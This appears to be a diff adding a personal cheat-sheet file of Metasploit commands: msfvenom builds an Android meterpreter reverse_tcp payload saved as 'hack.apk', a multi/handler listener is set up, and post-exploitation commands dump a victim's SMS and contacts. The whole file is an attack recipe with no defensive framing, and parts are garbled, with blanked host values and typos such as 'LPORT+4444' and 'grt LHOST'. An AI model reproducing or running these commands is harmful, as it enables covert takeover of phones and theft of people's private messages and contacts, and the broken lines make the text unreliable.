@@ -1,0 +1,31 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST= ........  LPORT+4444 R > hack.apk
+
+msfconsole
+> use multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost .......
+set lport ......
+exploit
+
+sysinfo
+dump_sms
+dump_comtact
+.
+.
+.
+.
+.
+.
+.
+.
+.
+
+help
+
+
+
+
+
+
+
+grt LHOST = ifconfig
